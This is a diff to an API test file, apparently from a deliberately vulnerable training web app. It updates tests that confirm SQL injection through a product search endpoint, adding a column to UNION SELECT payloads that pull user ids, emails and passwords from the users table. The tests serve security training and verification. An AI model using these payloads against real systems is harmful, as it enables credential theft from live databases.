@@ -60,7 +60,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search can create UNION SELECT with Users table and fixed columns', () => {
-    return frisby.get(REST_URL + '/products/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\' from users--')
+    return frisby.get(REST_URL + '/products/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' from users--')
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
@@ -68,14 +68,15 @@ describe('/rest/products/search', () => {
         name: '2',
         description: '3',
         price: '4',
-        image: '5',
-        createdAt: '6',
-        updatedAt: '7'
+        deluxePrice: '5',
+        image: '6',
+        createdAt: '7',
+        updatedAt: '8'
       })
   })
 
   it('GET product search can create UNION SELECT with Users table and required columns', () => {
-    return frisby.get(REST_URL + '/products/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
+    return frisby.get(REST_URL + '/products/search?q=\')) union select null,id,email,password,null,null,null,null,null from users--')
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
